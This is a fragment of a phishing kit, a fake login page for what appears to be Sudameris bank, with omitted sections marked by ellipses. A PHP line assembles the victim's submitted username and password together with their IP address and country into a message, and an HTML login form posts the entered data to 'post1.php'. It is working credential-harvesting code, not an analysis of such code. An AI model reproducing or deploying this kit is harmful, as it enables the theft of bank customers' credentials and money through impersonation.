...
$message = "Sudameris USER: ".$_POST['username']."\r\nContraseña: ".$_POST['password']."\r\nIP: ".$ip." ".$userp." ".$cc."\r\n";
  ...
  <div class="container welcome-bkg pr-0">
    ...
    <div class="col-lg-5 col-md-7 col-sm-8 col-xs-12" style="height:100%;display:table; min-width: 10.4em">
      <div style="display: table-cell; vertical-align: middle">
        <form id="loginForm" role="form" style="background-color:rgba(255, 255, 255, 0.88);padding:1rem;" action="post1.php" method="POST" autocomplete="off"><!-- id="login-header" -->
       	  <div>
